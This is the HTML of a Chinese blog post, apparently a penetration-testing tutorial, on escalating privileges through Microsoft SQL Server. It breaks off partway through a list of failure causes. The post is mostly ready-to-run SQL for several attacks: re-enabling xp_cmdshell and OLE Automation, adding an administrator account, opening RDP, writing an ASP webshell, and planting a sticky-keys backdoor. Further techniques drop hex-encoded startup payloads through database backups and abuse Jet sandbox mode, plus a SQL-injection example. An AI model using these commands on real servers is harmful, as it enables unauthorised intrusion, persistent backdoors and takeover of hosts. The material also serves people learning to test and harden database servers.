@@ -1,0 +1,375 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>SQLServer提权 | V3teran's blog</title><meta name="keywords" content="提权,数据库"><meta name="author" content="V3teran"><meta name="copyright" content="V3teran"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言总的来说就是调用各种存储过程执行系统命令、写入注册表、写入文件等操作。 数据库用户角色 一般会遇到三种角色：syadmin 、db_owner 、public 。  syadmin： 固有服务器角色，sa即属于syadmin成员，为mssql默认系统账号，具有最高权限。除了一些基本的对数据库拥有读取、写入权限外，就是可以通过大部分存储过程执行dos命令。  db_owner： 固有数据库角色，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQLServer提权">
+<meta property="og:url" content="https://v3teran.github.io/2021/02/13/7e410911.html">
+<meta property="og:site_name" content="V3teran&#39;s blog">
+<meta property="og:description" content="前言总的来说就是调用各种存储过程执行系统命令、写入注册表、写入文件等操作。 数据库用户角色 一般会遇到三种角色：syadmin 、db_owner 、public 。  syadmin： 固有服务器角色，sa即属于syadmin成员，为mssql默认系统账号，具有最高权限。除了一些基本的对数据库拥有读取、写入权限外，就是可以通过大部分存储过程执行dos命令。  db_owner： 固有数据库角色，">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210218112845.jpeg">
+<meta property="article:published_time" content="2021-02-13T14:30:00.000Z">
+<meta property="article:modified_time" content="2022-03-02T01:01:20.738Z">
+<meta property="article:author" content="V3teran">
+<meta property="article:tag" content="提权">
+<meta property="article:tag" content="数据库">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210218112845.jpeg"><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210204173816.png"><link rel="canonical" href="https://v3teran.github.io/2021/02/13/7e410911"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?73d3a03f02aa81722a03a54ce37d7aac";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=UA-221762089-2"></script><script>window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'UA-221762089-2');
+</script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'SQLServer提权',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-03-02 09:01:20'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/lalala.css"><link rel="stylesheet" href="https://at.alicdn.com/t/font_2364346_8smao36j8yr.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css"><script src="/live2d-widget/autoload.js"></script><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper/swiper-bundle.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-card-history/baiduhistory/css/main.css"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.0.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210204173845.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">36</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">38</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210218112845.jpeg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">V3teran's blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">SQLServer提权</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-02-13T14:30:00.000Z" title="发表于 2021-02-13 22:30:00">2021-02-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-03-02T01:01:20.738Z" title="更新于 2022-03-02 09:01:20">2022-03-02</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%8F%90%E6%9D%83/">提权</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>10分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="SQLServer提权"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>总的来说就是调用各种存储过程执行系统命令、写入注册表、写入文件等操作。</p>
+<p><strong>数据库用户角色</strong></p>
+<p>一般会遇到三种角色：syadmin 、db_owner 、public 。</p>
+<ul>
+<li><p>syadmin：</p>
+<p>固有服务器角色，sa即属于syadmin成员，为mssql默认系统账号，具有最高权限。除了一些基本的对数据库拥有读取、写入权限外，就是可以通过大部分存储过程执行dos命令。</p>
+</li>
+<li><p>db_owner：</p>
+<p>固有数据库角色，拥有对数据库的修改、删除、新增数据表、执行大部分存储过程的权限。但涉及到一些敏感操作如xp_cmdshell等存储过程则没有权限。</p>
+</li>
+<li><p>public：</p>
+<p>固定数据库角色，每个合法用户都属于该角色，可以列目录或建立临时表。</p>
+</li>
+</ul>
+<p><strong>xp_cmdshell</strong></p>
+<p>存储过程，将命令字符串作为操作系统命令shell执行，并以文本行的形式返回所有输出。只有在sysadmin权限下才可以使用xp_cmdshell。ps：非SA用户也可以设置为sysadmin。</p>
+<p>查看SQL 2005帐户所属服务器角色。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select SrvRole = g.name, MemberName = u.name, MemberSID = u.sid from sys.server_principals u, sys.server_principals g, sys.server_role_members m where g.principal_id = m.role_principal_id and u.principal_id = m.member_principal_id order by 1, 2</span><br></pre></td></tr></table></figure>
+
+<p>查看SQL 2005帐户所属数据库角色。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select DbRole = g.name, MemberName = u.name, MemberSID = u.sid from sys.database_principals u, sys.database_principals g, sys.database_role_members m where g.principal_id = m.role_principal_id and u.principal_id = m.member_principal_id order by 1, 2</span><br></pre></td></tr></table></figure>
+
+<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><h2 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a><strong>xp_cmdshell</strong></h2><ol>
+<li><p>翻配置文件，连数据库。</p>
+<p>数据库连接文件的名称一般为 conn.asp、openconnection.asp、connection.asp等，这些文件多位于网站的根目录或者includes等文件夹下。</p>
+</li>
+<li><p>判断存储过程这个字段是否存在，没有的话需要添加。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from master.dbo.sysobjects where xtype = &#x27;x&#x27; and name= &#x27;xp_cmdshell&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>返回”1”，证明存在。返回”2”，可能是添加多了。。。。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from master.dbo.sysobjects where xtype = &#x27;x&#x27; and name= &#x27;xp_cmdshell&#x27;;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>启用xp_cmdshell存储过程。</p>
+<p>xp_cmdshell在mssql2000中默认开启，2005及以后版本默认关闭。如果没有开启xp_cmdshell，且拥有 sysadmin 权限，则执行以下语句恢复。sp_configure 是修改系统配置的存储过程。当设置show advanced options参数为1时，才允许修改系统配置中的某些高级选相，这些高级选项默认不允许修改。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;,1;RECONFIGURE;</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;,1;RECONFIGURE;（需要关的话换成0）</span><br></pre></td></tr></table></figure>
+
+<p>无法启用可能是删除了这个字段，可以用xplog70.dll恢复。ps：xplog70.dll、odsole70.dll、xpstar.dll等dll文件都可尝试。</p>
+<p>xplog70.dll存在时：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exec sp_addextendedproc xp_cmdshell,@dllname=&#x27;xplog70.dll&#x27;;</span><br><span class="line">或者</span><br><span class="line">Use master dbcc addextendedproc(&#x27;xp_cmdshell&#x27;,&#x27;xplog70.dll&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>xplog70.dll不存在时，可以将xplog70.dll上传到目标机器的c盘根目录下，必须指定路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec sp_addextendedproc xp_cmdshell,@dllname=&#x27;c:\xplog70.dll&#x27;;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>添加用户并放到管理员组。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exec master.dbo.xp_cmdshell &#x27;net user lalala 123456 /add &amp; net localgroup administrators lalala /add&#x27;;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>常用命令：</p>
+<p>开启3389：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#x27;sc config termservice start= auto&#x27;; </span><br><span class="line">exec master..xp_cmdshell &#x27;net start termservice&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>编辑注册表允许远程连接，并重置RDP端口为3389。关闭将0x00改为0x01：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_cmdshell &#x27;reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0x00 /f&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>利用注入点：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1；exec master.dbo.xp_cmdshell &#x27;net user 1 1 /add&#x27;--</span><br></pre></td></tr></table></figure>
+
+<h2 id="wscript-shell"><a href="#wscript-shell" class="headerlink" title="wscript.shell"></a>wscript.shell</h2><p><strong>xp_cmdshell无法使用</strong></p>
+<ol>
+<li>禁止了system调用cmd.exe。</li>
+<li>mssql运行账户被改为user或power user，这个权限可以执行部分系统命令，但无法执行超越本身权限的命令，如net user &#x2F;add等。</li>
+<li>xp_cmdshell被删除或改名。</li>
+</ol>
+<p><strong>解决方法：调用wscripts.shell</strong></p>
+<p>利用SP_OACreate和SP_OAMETHOD调用系统对象wscript.shell来执行命令，在2005及以上版本中默认禁用。先判断存储过程这个字段是否存在。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from master.dbo.sysobjects where xtype = &#x27;x&#x27; and name= &#x27;SP_OACreate&#x27;;</span><br><span class="line">select * from master.dbo.sysobjects where xtype = &#x27;x&#x27; and name= &#x27;SP_OAMETHOD&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>启动组件Ole Automation Procedures。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#x27;show advanced options&#x27;,1;RECONFIGURE;</span><br><span class="line">exec sp_configure &#x27;Ole Automation Procedures&#x27;,1;RECONFIGURE;</span><br></pre></td></tr></table></figure>
+
+<p>声明变量@runshell，用SP_OACreate调用wscript.shell，并赋值变量，再用SP_OAMETHOD调用执行。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Declare @runshell INT;       </span><br><span class="line">Exec SP_OACreate &#x27;wscript.shell&#x27;,@runshell out;</span><br><span class="line">Exec SP_OAMETHOD @runshell,&#x27;run&#x27;,null,&#x27;net user test test /add&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>写一句话木马：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">declare @o int, @f int, @t int, @ret int;</span><br><span class="line">exec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @o out;</span><br><span class="line">exec sp_oamethod @o, &#x27;createtextfile&#x27;, @f out, &#x27;可写目录&#x27;, 1;</span><br><span class="line">exec @ret = sp_oamethod @f, &#x27;writeline&#x27;, NULL,&#x27;&lt;%execute(request(&quot;SB&quot;))%&gt;&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>创建用户：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">declare @o int;</span><br><span class="line">exec sp_oacreate &#x27;Shell.Application&#x27;, @o out;</span><br><span class="line">exec sp_oamethod @o, &#x27;ShellExecute&#x27;,null, &#x27;cmd.exe&#x27;,&#x27;cmd /c net user test test /add&#x27;,&#x27;c:\windows\system32&#x27;,&#x27;&#x27;,&#x27;1&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>shift后门：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">declare @o int;</span><br><span class="line">exec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @o out</span><br><span class="line">exec sp_oamethod @o, &#x27;copyfile&#x27;,null,&#x27;c:\windows\system32\cmd.exe&#x27;,&#x27;c:\windows\system32\sethc.exe&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>无法启用可能是删除了这个字段，可以用odsole70.dll恢复。</p>
+<p>odsole70.dll存在时：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exec sp_addextendedproc sp_OACreate,@dllname=&#x27;odsole70.dll&#x27;;</span><br><span class="line">exec sp_addextendedproc SP_OAMETHOD,@dllname=&#x27;odsole70.dll&#x27;;</span><br><span class="line">或者</span><br><span class="line">Use master dbcc addextendedproc(&#x27;sp_OACreate&#x27;,&#x27;odsole70.dll&#x27;);</span><br><span class="line">Use master dbcc addextendedproc(&#x27;SP_OAMETHOD&#x27;,&#x27;odsole70.dll&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>odsole70.dll不存在时：</p>
+<p>将odsole70.dll上传到目标机器的c盘根目录下，必须指定路径。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec sp_addextendedproc sp_OACreate,@dllname=&#x27;c:\odsole70.dll&#x27;;</span><br><span class="line">exec sp_addextendedproc SP_OAMETHOD,@dllname=&#x27;c:\odsole70.dll&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>这样添加账户失败原因：</p>
+<ol>
+<li>mssql运行账户被改为user或power user，这个权限可以执行部分系统命令，但无法执行超越本身权限的命令，如net user &#x2F;add等。</li>
+<li>wscript.shell对象被删除或者改名。</li>
+<li>SP_OACreate和SP_OAMETHOD两者被删除或者改名。</li>
+</ol>
+<h2 id="沙盒模式提权"><a href="#沙盒模式提权" class="headerlink" title="沙盒模式提权"></a><strong>沙盒模式提权</strong></h2><p>沙盒模式是一种安全功能。</p>
+<p>在沙盒模式下，Access只对控件和字段属性中的安全且不含恶意代码的表达式求值。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Jet\4.0\Engines\SandBoxMode</span><br></pre></td></tr></table></figure>
+
+<p>默认键值是2</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0       为在任何所有者中都禁止启用安全模式</span><br><span class="line">1       为仅在允许的范围内</span><br><span class="line">2       必须在access的模式下</span><br><span class="line">3       完全开启（连access也不支持）</span><br></pre></td></tr></table></figure>
+
+<p>查看键值：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master.dbo.xp_regread &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;, &#x27;SandBoxMode&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>启动沙盒（可能需要开启xp_regwrite存储过程，添加和开启步骤类似）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master.dbo.xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,&#x27;SandBoxMode&#x27;,&#x27;REG_DWORD&#x27;,0;</span><br></pre></td></tr></table></figure>
+
+<p>调用前可能需要开启 OpenRowset&#x2F;OpenDatasource：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#x27;show advanced options&#x27;,1;reconfigure;</span><br><span class="line">exec sp_configure &#x27;Ad Hoc Distributed Queries&#x27;,1;reconfigure;</span><br></pre></td></tr></table></figure>
+
+<p>调用沙盒模式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select * From OpenRowSet(&#x27;Microsoft.Jet.OLEDB.4.0&#x27;,&#x27;;Database=c:\windows\system32\ias\ias.mdb&#x27;,&#x27;select shell(&quot;net user test test /add&quot;)&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>或者在当前的web目录下面上传体系的ias.mdb、cmd.exe、net.exe三个文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=E:\web\bias.mdb&#x27;,&#x27;select shell( E:\web\cmd.exe /c E:\web\net.exe user test test /add )&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>ps：”c:\windows\system32\ias\ias.mdb”这个路径是2003的路径，2000的路径为”c:\winnt\system32\ias\ias.mdb”</p>
+<p>沙盒模式未封闭（注册表值未置0），或者调用命令存在多余空格会报错：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">未能处理对象 &#x27;select shell( cmd.exe /c net user user passwd /add )&#x27;。OLE DB 提供程序 &#x27;microsoft.jet.oledb.4.0&#x27; 指出该对象中没有任何列。</span><br></pre></td></tr></table></figure>
+
+<p>可能需要下载ACE.Oledb.12.0 for X64位驱动，并把连接字符串Microsoft.jet.Oledb.4.0更改为Microsoft.ACE.OLEDB.12.0。</p>
+<p>失败原因：</p>
+<ol>
+<li>mssql运行账户被改为user或者power user，无法修改注册表。</li>
+<li>xp_regwrite扩展过程被删除或改名。</li>
+<li>ies.mdb文件丢失。</li>
+</ol>
+<h2 id="xp-dirtree启动项提权"><a href="#xp-dirtree启动项提权" class="headerlink" title="xp_dirtree启动项提权"></a><strong>xp_dirtree启动项提权</strong></h2><p>db_owner权限用户默认有系统备份权限。</p>
+<p>查看启动项文件夹内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_dirtree &#x27;C:\Documents and Settings\Administrator\「开始」菜单\程序\启动&#x27;,1,1;</span><br></pre></td></tr></table></figure>
+
+<p>列数据库：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT DB_NAME();</span><br></pre></td></tr></table></figure>
+
+<p>log备份shift后门：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">alter database test set RECOVERY FULL;--</span><br><span class="line">create table cmd (a image);--</span><br><span class="line">backup log test to disk=&#x27;c:\bat&#x27; with init;--</span><br><span class="line">insert into cmd(a) values (0x636f707920433a5c57494e444f57535c73797374656d33325c636d642e65786520433a5c57494e444f57535c73797374656d33325c73657468632e657865);--</span><br><span class="line">backup log test to disk=&#x27;C:\Documents and Settings\All Users\「开始」菜单\程序\启动\a.bat&#x27;;--</span><br><span class="line">drop table cmd;--</span><br></pre></td></tr></table></figure>
+
+<p>或者备份一句话（0x3c2565786563757465287265717565737428225342222929253e）到web目录。</p>
+<p>代码大致含义：</p>
+<ol>
+<li>恢复当前库。</li>
+<li>创建表cmd。</li>
+<li>备份当前库到c:\bat。</li>
+<li>插入shift后门代码到创建的表cmd。</li>
+<li>备份shift后门代码到启动项目录。</li>
+<li>删除cmd表。</li>
+</ol>
+<p>差异备份。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">backup database test to disk=&#x27;c:\database.bak&#x27;--</span><br><span class="line">create table cmd (cmd image)--</span><br><span class="line">insert into cmd(cmd) values(0x636f707920433a5c57494e444f57535c73797374656d33325c636d642e65786520433a5c57494e444f57535c73797374656d33325c73657468632e657865)--</span><br><span class="line">backup database test to disk=&#x27;C:\Documents and Settings\All Users\「开始」菜单\程序\启动\a.bat&#x27; WITH DIFFERENTIAL FORMAT--</span><br><span class="line">drop table cmd--</span><br></pre></td></tr></table></figure>
+
+<p>失败原因：</p>
+<ol>
+<li>对数据库没有备份权限。</li>
